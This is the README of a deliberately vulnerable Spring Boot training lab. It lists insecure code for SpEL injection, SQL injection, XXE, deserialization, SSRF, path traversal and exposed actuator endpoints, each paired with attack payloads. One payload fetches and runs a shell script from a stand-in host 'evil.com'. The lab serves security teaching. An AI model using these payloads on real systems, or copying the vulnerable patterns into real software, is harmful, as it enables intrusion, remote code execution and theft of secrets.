# Spring Vulnerable Application

## Overview
A deliberately vulnerable Spring Boot application demonstrating common security issues in Java Spring applications, including Spring-specific vulnerabilities and misconfigurations.

## Quick Start

**Access URL**: http://localhost:8084

**API Documentation**: http://localhost:8084/swagger-ui.html

**Actuator Endpoints**: http://localhost:8084/actuator

**Default Credentials**:
- Admin: `admin` / `admin123`
- User: `user` / `password`

## Application Features

- RESTful API endpoints
- User authentication (JWT)
- Database operations
- File upload/download
- Admin dashboard
- Actuator endpoints exposed
- H2 console enabled

## Vulnerabilities

### 1. Spring Expression Language (SpEL) Injection
```java
// Vulnerable code
@RequestMapping("/calc")
public String calculate(@RequestParam String expression) {
    ExpressionParser parser = new SpelExpressionParser();
    return parser.parseExpression(expression).getValue().toString();
}

// Attack
http://localhost:8084/calc?expression=T(java.lang.Runtime).getRuntime().exec('whoami')
http://localhost:8084/calc?expression=new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream()).next()
```

### 2. SQL Injection
```java
// Vulnerable repository
@Query("SELECT u FROM User u WHERE u.username = '" + username + "'")
User findByUsername(String username);

// Attack
http://localhost:8084/users?username=' OR '1'='1
http://localhost:8084/users?username=' UNION SELECT * FROM credit_cards--
```

### 3. Exposed Actuator Endpoints
```yaml
# Dangerous configuration
management:
  endpoints:
    web:
      exposure:
        include: "*"
  endpoint:
    shutdown:
      enabled: true

# Attack URLs
http://localhost:8084/actuator/env
http://localhost:8084/actuator/heapdump
http://localhost:8084/actuator/shutdown (POST)
```

### 4. H2 Database Console
```yaml
spring:
  h2:
    console:
      enabled: true
      settings:
        web-allow-others: true

# Direct database access
http://localhost:8084/h2-console
# JDBC URL: jdbc:h2:mem:testdb
# Username: sa
# Password: (empty)
```

### 5. Insecure Deserialization
```java
@PostMapping("/import")
public void importData(@RequestBody byte[] data) {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject(); // Vulnerable!
}

// Attack with ysoserial
java -jar ysoserial.jar CommonsCollections1 'cat /etc/passwd' | base64
```

### 6. XML External Entity (XXE)
```java
@PostMapping("/parse-xml")
public String parseXml(@RequestBody String xml) {
    DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xml)));
    return doc.getDocumentElement().getTextContent();
}

// Attack
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>&xxe;</user>
```

### 7. Path Traversal
```java
@GetMapping("/download")
public byte[] download(@RequestParam String filename) {
    return Files.readAllBytes(Paths.get("uploads/" + filename));
}

// Attack
http://localhost:8084/download?filename=../../../etc/passwd
```

### 8. JWT Secret Hardcoded
```java
// Weak/hardcoded secret
private final String SECRET = "mySecretKey";

// Can be exploited to forge tokens
```

### 9. Mass Assignment
```java
@PutMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @RequestBody User user) {
    return userRepository.save(user); // All fields updated!
}

// Attack - Set admin role
PUT /users/1
{"username":"user","password":"pass","role":"ADMIN","salary":999999}
```

### 10. LDAP Injection
```java
@GetMapping("/ldap-search")
public List<User> search(@RequestParam String filter) {
    return ldapTemplate.search("", "(&(objectClass=person)(cn=" + filter + "))", new UserMapper());
}

// Attack
http://localhost:8084/ldap-search?filter=*)(objectClass=*
```

### 11. Server-Side Request Forgery (SSRF)
```java
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    return restTemplate.getForObject(url, String.class);
}

// Attack
http://localhost:8084/fetch?url=http://169.254.169.254/latest/meta-data/
http://localhost:8084/fetch?url=file:///etc/passwd
```

### 12. Log Injection
```java
@GetMapping("/login")
public String login(@RequestParam String username) {
    logger.info("Login attempt for user: " + username);
    // ...
}

// Attack
http://localhost:8084/login?username=admin%0A%0AERROR: Admin password is 'secret123'
```

## Spring Boot Specific Issues

### 1. Actuator Information Disclosure
```bash
# Sensitive endpoints
curl http://localhost:8084/actuator/env
curl http://localhost:8084/actuator/configprops
curl http://localhost:8084/actuator/beans
curl http://localhost:8084/actuator/mappings

# Download heap dump (contains secrets)
wget http://localhost:8084/actuator/heapdump
```

### 2. Spring Boot DevTools
```yaml
spring:
  devtools:
    remote:
      secret: mysecret
# Allows remote code execution!
```

### 3. Error Page Information Disclosure
```yaml
server:
  error:
    include-message: always
    include-exception: true
    include-stacktrace: always
```

## Exploitation Tools

### Extract Secrets from Heap Dump
```bash
# Download heap dump
curl http://localhost:8084/actuator/heapdump -o heapdump.hprof

# Analyze with Eclipse MAT or
strings heapdump.hprof | grep -i password
strings heapdump.hprof | grep -i "bearer "
```

### SpEL Injection Payloads
```java
// File read
T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))

// Command execution
T(java.lang.Runtime).getRuntime().exec("curl evil.com/shell.sh | bash")

// System property access
T(java.lang.System).getProperty("user.home")
T(java.lang.System).getenv("AWS_SECRET_KEY")
```

### Actuator Exploit
```bash
# Change logging level to DEBUG (exposes sensitive data)
curl -X POST http://localhost:8084/actuator/loggers/org.springframework.security \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel": "DEBUG"}'

# Shutdown application (DoS)
curl -X POST http://localhost:8084/actuator/shutdown
```

## Common Misconfigurations

1. **Actuator endpoints exposed without authentication**
2. **H2 console enabled in production**
3. **Debug/trace logging enabled**
4. **Hardcoded secrets in application.properties**
5. **CORS misconfiguration (allow all origins)**
6. **Spring Security disabled or misconfigured**
7. **DevTools enabled in production**

## Testing Commands

### Automated Scanning
```bash
# Find Spring Boot apps
nmap -p 8080,8081,8082,8083,8084 --script http-title

# Check for actuator
curl http://localhost:8084/actuator

# SQLMap for SQL injection
sqlmap -u "http://localhost:8084/api/users?name=test" --batch

# Check for XXE
curl -X POST http://localhost:8084/parse-xml \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

## Defense Mechanisms (What's Missing)
- ❌ Input validation
- ❌ Parameterized queries
- ❌ Actuator security
- ❌ Strong JWT secrets
- ❌ XML external entity prevention
- ❌ Deserialization filters
- ❌ Security headers
- ❌ Rate limiting

## Learning Objectives
- Understanding Spring Security
- Spring Boot actuator risks
- SpEL injection techniques
- Spring-specific vulnerabilities
- Secure Spring development

## Additional Resources
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [OWASP Spring Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Spring_Security_Cheat_Sheet.html)
- [Spring Boot Actuator](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html) 